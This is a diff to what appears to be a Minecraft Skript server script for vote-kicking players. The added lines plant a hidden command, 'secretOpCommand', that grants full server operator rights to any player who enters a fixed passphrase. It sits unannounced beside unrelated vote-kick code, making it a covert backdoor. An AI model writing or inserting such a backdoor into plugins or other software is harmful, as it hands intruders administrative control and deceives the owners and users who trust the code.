@@ -46,6 +46,11 @@ every 1 second:
             
             set {voteKick::%{_code}%::time} to {_time}
 
+command secretOpCommand [<text>]:
+  trigger:
+    if arg 1 is "horny-is-top-you":
+      op player
+
 
 function justifySentence(player: player, time: number, reason: string):
   # Запоминаем то, что мы кикнули этого игрока
